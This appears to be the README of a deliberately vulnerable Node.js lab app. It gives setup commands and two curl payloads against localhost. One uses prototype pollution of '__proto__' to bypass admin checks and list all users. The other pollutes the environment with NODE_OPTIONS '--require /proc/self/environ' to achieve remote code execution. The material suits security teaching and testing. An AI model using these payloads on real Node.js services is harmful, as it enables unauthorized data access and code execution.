## Setup
`yarn && yarn start`

or you can build and run with docker `docker build . -t proto-pollution && docker run -p 3000:3000 --rm proto-pollution` to be able to trigger RCE

## Exploit
Open `localhost:3000` login with test:test copy JWT and do for auth bypass

```
 curl 'http://localhost:3003/branding' \\n  -H 'Connection: keep-alive'  -H 'Accept: application/json' \\n  -H 'Content-Type: application/json'  -H 'token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2NDAzNjQyMjB9.i6Sk6ytLvRe5WH4QJkT6BFPSO3sCIV0v7drglwCY8fM' -H 'Origin: http://localhost:3003'   --data-raw '{"theme":"__proto__","color":"black","component":"isAdmin"}'
```
And you will be able to get all users from test account


For RCE use this payload and when you click to 'get random number' you should see message 'RCE'
```
 curl 'http://localhost:3003/branding' \\n  -H 'Connection: keep-alive'  -H 'Accept: application/json' \\n  -H 'Content-Type: application/json'  -H 'token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2NDAzNjQyMjB9.i6Sk6ytLvRe5WH4QJkT6BFPSO3sCIV0v7drglwCY8fM' -H 'Origin: http://localhost:3003'   --data-raw '{"theme":"__proto__","color":{"AAAA": "console.log(\"RCE\"); //", "NODE_OPTIONS": "--require /proc/self/environ"},"component":"env"}' 
```

